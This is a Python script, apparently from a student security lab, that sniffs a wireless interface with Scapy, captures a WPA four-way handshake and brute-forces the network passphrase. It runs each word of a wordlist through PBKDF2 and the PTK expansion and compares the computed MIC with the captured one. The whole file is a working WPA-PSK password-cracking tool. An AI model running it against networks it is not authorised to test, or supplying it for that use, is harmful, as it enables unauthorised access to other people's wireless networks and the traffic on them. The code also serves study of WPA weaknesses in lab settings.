#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
from numpy import right_shift
import hmac, hashlib
import argparse
import sys

# Arguments
parser = argparse.ArgumentParser(description="")
parser.add_argument("-i", "--interface", required=True, help="l'interface a utiliser")
parser.add_argument("-s", "--ssid", required=True, help="le ssid de l'AP à brute force")

arguments = parser.parse_args()

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = arguments.ssid
handshakeCounter = 0
handshakeList = list()
APmac = ""
Clientmac = ""

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def packetHandling(packet):
    global handshakeCounter
    global APmac
    global Clientmac

    if(EAPOL in packet):
        # We are checking if the retransmission flag is set, if it's set 
        retransmittedPacket = packet.FCfield & 0x8
        

        if(handshakeCounter == 0 or APmac == a2b_hex(packet.addr3.replace(":", "")) and retransmittedPacket != "retry"):
            handshakeCounter += 1
            handshakeList.append(packet)
            print("[+] Found handshake part " + str(handshakeCounter) + " over 4")

        if(handshakeCounter == 1):
            APmac       = a2b_hex(handshakeList[0].addr2.replace(":", ""))
            Clientmac   = a2b_hex(handshakeList[0].addr1.replace(":" , ""))
        
        # We got the 4 packets of the handshake
        if(len(handshakeList) == 4):
            bruteForceWPA(handshakeList)

def bruteForceWPA(handshakeList):
    global ssid
    global APmac
    global Clientmac

    # Authenticator and Supplicant Nonces
    nonceStartingOffset = 13
    nonceEndOffset = 45
    ANonce      = handshakeList[0].load[nonceStartingOffset:nonceEndOffset]
    SNonce      = handshakeList[1].load[nonceStartingOffset:nonceEndOffset]

    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
    micStartingOffset = 77
    micEndOffset = 93
    mic_to_test = handshakeList[3].load[micStartingOffset:micEndOffset]

    B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

    # Here we are taking the data from the WIFI version, until the start of the MIC, and then we simply append a bunch of zero bytes at the end.
    data        = bytes(handshakeList[3][EAPOL])[:micStartingOffset] + b'\x00' * 22
    ssid = str.encode(ssid)
    fileName = "wordlist.txt"
    found = False

    # Used to know wether it's HMAC-MD5 or HMAC-SHA1
    keyDescriptorVersion = int.from_bytes(handshakeList[0].load[0:1], byteorder='big')

    with open(fileName) as wordlist:
        for passPhrase in wordlist:
            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            # We are getting rid of the '\n'
            passPhrase = str.encode(passPhrase[:-1])
            pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)

            #expand pmk to obtain PTK
            ptk = customPRF512(pmk,str.encode(A),B)

            #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            if(keyDescriptorVersion == 2):
                mic = hmac.new(ptk[0:16],data,hashlib.sha1)
            else:
                mic = hmac.new(ptk[0:16],data,hashlib.md5)

            if mic.hexdigest() == b2a_hex(mic_to_test).decode():
                print("[+] Found passphrase: " + passPhrase.decode())
                # Source: https://www.geeksforgeeks.org/python-exit-commands-quit-exit-sys-exit-and-os-_exit/
                sys.exit("")
        
        if not found:
            print("[-] Passphrase not found !")

# On commence a sniffer, chaque packet collecte est envoye a la fonction handlePacket
a = sniff(iface=arguments.interface, prn=packetHandling)